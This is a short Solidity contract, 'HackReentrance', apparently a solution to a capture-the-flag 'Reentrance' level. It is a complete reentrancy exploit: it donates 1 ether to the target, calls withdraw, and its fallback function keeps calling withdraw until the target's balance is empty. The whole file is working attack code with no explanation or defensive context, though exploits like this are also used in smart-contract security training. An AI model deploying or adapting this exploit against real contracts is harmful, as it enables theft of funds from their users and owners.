// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IReentrance {
  function donate(address _to) external payable;
  function withdraw(uint _amount) external;
}

contract HackReentrance {
  IReentrance public reentranceAddress;
  uint public amountToWithdraw = 1 ether;

  constructor(IReentrance _reentranceAddress) public payable {
    reentranceAddress = IReentrance(_reentranceAddress);
  }

  function becomeDonor() public {
    reentranceAddress.donate.value(amountToWithdraw)(address(this));
  }

  function startAttack() public {
    reentranceAddress.withdraw(amountToWithdraw);
  }

  fallback() external payable {
    if(address(reentranceAddress).balance != 0){
      reentranceAddress.withdraw(amountToWithdraw);
    }
  }
}
